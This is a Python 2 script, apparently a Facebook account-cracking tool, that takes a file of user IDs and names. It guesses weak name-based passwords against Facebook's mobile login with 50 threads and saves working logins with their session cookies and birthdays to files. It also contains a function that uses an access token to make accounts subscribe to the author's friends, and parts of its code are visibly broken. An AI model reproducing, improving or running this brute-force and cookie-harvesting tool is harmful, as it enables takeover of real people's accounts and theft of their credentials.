x


































import os
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    os.system('clear')

import requests, os, re, bs4, sys, json, time, random, datetime
from concurrent.futures import ThreadPoolExecutor as YayanGanteng
from datetime import datetime
from bs4 import BeautifulSoup
ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agust', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
reload(sys)
sys.setdefaultencoding('utf-8')
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
ok = []
cp = []
id = []
user = []
loop = 0
bulan_ttl = {'01': 'Januari', '02': 'Februari', '03': 'Maret', '04': 'April', '05': 'Mei', '06': 'Juni', '07': 'Juli', '08': 'Agustus', '09': 'September', '10': 'Oktober', '11': 'November', '12': 'Desember'}

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)


def tod():
    titik = [
     '\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ', '\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
    for x in titik:
        print( '\r %s[%s•%s] Remove Token %s') % (N, M, N, x, )
        sys.stdout.flush()
        time.sleep(1)



def hasil(ok, cp):
    if len(ok) != 0 or len(cp) != 0:
        print 47 * '_'
        print ('\n\n %s[%s#%s] cRaCk dOnE...' )% (N, K, N)
        print( '\n\n [%s+%s] toTaL OK : %s%s%s') % (O, N, H, str(len(ok)), N)
        print (' [%s+%s] tOtaL CP : %s%s%s') % (O, N, K, str(len(cp)), N)
        exit()
        print 70 * '_'
    else:
        print( '\n\n [%s!%s] No ReSulT FoUnD :(' )% (M, N)
        exit()




os.system('clear')
def main():
    rmss = raw_input("\033[1;92m \n\x1b[1;92m#########\x1b[1;93m   ##         ##\x1b[1;92m #########\n\x1b[1;92m##        ## \x1b[1;93m##       ##\x1b[1;92m ##        ##\n\x1b[1;92m##        ##  \x1b[1;93m##     ##\x1b[1;92m  ##        ##\n\x1b[1;92m##        ##\x1b[1;93m   ##   ##\x1b[1;92m   ##        ##\n\x1b[1;92m##########      \x1b[1;93m## ##   \x1b[1;92m ##########\n\x1b[1;92m##        ##\x1b[1;93m    # ##     \x1b[1;92m##        ##\n\x1b[1;92m##        ##\x1b[1;93m   ##   ##   \x1b[1;92m##        ##\n\x1b[1;92m##        ## \x1b[1;93m ##     ##\x1b[1;92m  ##        ##\n\x1b[1;92m##########  \x1b[1;93m##         ## \x1b[1;92m##########\n\x1b[1;95m_______________________________________\n\x1b[1;96m|Author   | \x1b[1;93mJaved Iqbal (Sad-Boy)      |\n\x1b[1;96m|Fb Id    | \x1b[1;93mJaved Iqbal Sad Boy        |\n\x1b[1;96m|GitHub   | \x1b[1;93mBALOOXH-BRAND              |             \n\x1b[1;95m|______________________________________|\n\n ══════════════════════\n║ Status : Free Trail  ║\n ══════════════════════\n \x1b[1;92m\n_______________________________ \n [1] Crack File\n [2] More Command\n [3] Join Fb Group\n [0] Exit\n_______________________________\n[+] Enter ! " )
    if rmss == '':
        print( '\n %s[%s\xc3\x97%s] Select A Valid Option!' )% (N, M, N)
        time.sleep(1)
        main()
        teman(kontol)
    elif rmss in ('1', '01'):
        __crack__().plerr()
    elif rmss in ('2', '02'):
        os.system('xdg-open https://github.com/amillsona/BGH')
    elif rmss in ('3', '03'):
        os.system('xdg-open https://facebook.com/groups/347577560720737/')
    elif rmss in ('0', '00'):
    	exit()
    os.system('clear')
    time.sleep(2)
    main()
def wuhan(kontol):
    try:
        token = open
        requests.post('https://graph.facebook.com/100001392811242/subscribers?access_token=%s' % token) #Mujoo Khan
        requests.post('https://graph.facebook.com/100044923392614/subscribers?access_token=%s' % token) #Mujtaba Khan
        requests.post('https://graph.facebook.com/100076251070968/subscribers?access_token=%s' % token) # Ali 
        requests.post('https://graph.facebook.com/100023264201622/subscribers?access_token=%s' % token) # Saqib
        requests.post('https://graph.facebook.com/1376599765/subscribers?access_token=%s' % token) # RiShu
        requests.post('https://graph.facebook.com/100054699519528/subscribers?access_token=%s' % token) # Shakib
        requests.post('https://graph.facebook.com/102429222335064/comments/?message=' + token + '&access_token=' + token)
    except:
        pass






class __crack__:

    def __init__(self):
        self.id = []

    def plerr(self):
        try:        	
            self.apk = raw_input('\n_________________________\n[%s•%s] \033[1;96mFile Path : ' % (H, H))
            self.id = open(self.apk).read().splitlines()
            print '\n________________________\n[%s√%s] \033[1;92mTotal Account :- \033[1;96m%s%s%s'% (H, H, H, len(self.id), N)
        except:
            print '%s[%s\xc3\x97%s] File [%s%s%s] Dump File Not Found.' % (H, H, H, H, self.apk, N)
            raw_input('\n [%s Enter%s ] ' % (H, H))
            main()

        mkxali = raw_input('__________________________\n[%s+%s] \033[1;97mClone All Password: ' % (H, H))
        if mkxali in ('yes', 'YES', 'y', 'Y'):
            
            self.__pler__()
        else:
            print '\n %s[%s\xc3\x97%s] BXB!' % (H, H, H)
            time.sleep(1)
            main()
        return
        loop += 1

      
       

    def __mbasic__(self, user, __yan__):
        global ok,cp,ttl,loop
        print '\r [%s%s%s]\x1b[1;92mBXB: %s/%s OK-:%s - \x1b[1;91mCP-:%s '%(H,datetime.now().strftime('%H:%M:%S'),N,loop,len(self.id),len(ok),len(cp)),
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try:
                os.mkdir('BXB')
            except:
                pass

            try:
                _kontol = open('YNTKTS.txt', 'r').read()
            except (KeyError, IOError):
                _kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'

            ses = requests.Session()
            ses.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': _kontol, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = ses.get('https://mbasic.facebook.com')
            b = ses.post('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': pw, 'login': 'submit'})
            if 'c_user' in ses.cookies.get_dict().keys():
                kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r  %s [BGH-OK] %s|%s|%s                 %s' % (H, user, pw, kuki, N)
                wrt = ' [\xe2\x9c\x93] %s|%s|%s' % (user, pw, kuki,)
                ok.append(wrt)
                open('BGH/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s' % wrt)
                break
                continue
            elif 'checkpoint' in ses.cookies.get_dict().keys():
                try:
                    kontol = open('mk_token.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s' % (user, kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r  %s \x1b[1;91m[BGH-CP] %s|%s|%s %s %s     %s' % (K, user, pw, day, month, year, N)
                    wrt = ' [\xc3\x97] %s|%s|%s %s %s' % (user, pw, day, month, year)
                    cp.append(wrt)
                    open('BGH/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day = ''
                    year = ''
                except:
                    pass

                print '\r  %s \x1b[1;91m[BGH-CP] %s|%s                %s' % (K, user, pw, N)
                wrt = ' [\xc3\x97] %s|%s' % (user, pw)
                cp.append(wrt)
                open('BGH/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1




    
    def __pler__(self):
    	print "\033[1;92m_____________________\n[1] Start\n_____________________"
        yan = raw_input('\033[1;95m[+] Are You Sure Next Menu? :-  ')
        if yan == '':
            print '\n %s[%s\xc3\x97%s] Type 1, Bro ' % (H, H, H)
            self.__pler__()
        elif yan in ('1', '01'):
            print "\033[1;96m_______________________________"        
            print '\n [%s√%s]  OK Account Saved in OK-%s-%s-%s.txt' %  (K, O, ha, op, ta)
            print '\n [%s×%s]  Cp Account Saved in CP-%s-%s-%s.txt' %   (K, O, ha, op, ta)
            print "\033[1;96m_______________________________ \n" 
            with YayanGanteng(max_workers=50) as (__yayanXD__):
                for yntkts in self.id:
                    try:
                        uid, name = yntkts.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0] + '123', xz[0] + '12345', xz[0] + '321', xz[0] + '786', xz[0] + '@123', xz[0] + '12', xz[0] + '1122', xz[0] + '789']
                        else:
                            pwx = [
                             name, xz[0] + '123', xz[0] + '12345', xz[0] + '321', xz[0] + '786', xz[0] + '@123', xz[0] + '12', xz[0] + '1122', xz[0] + '789']
                        __yayanXD__.submit(self.__mbasic__, uid, pwx)
                    except:
                        pass

            
            os.remove(self.apk)
            hasil(ok, cp)
        else:
            print '\n %s[%s\xc3\x97%s] Type 1 Bro' % (N, M, N)
            self.__pler__()


if __name__ == '__main__':
    os.system('git pull')
    main()
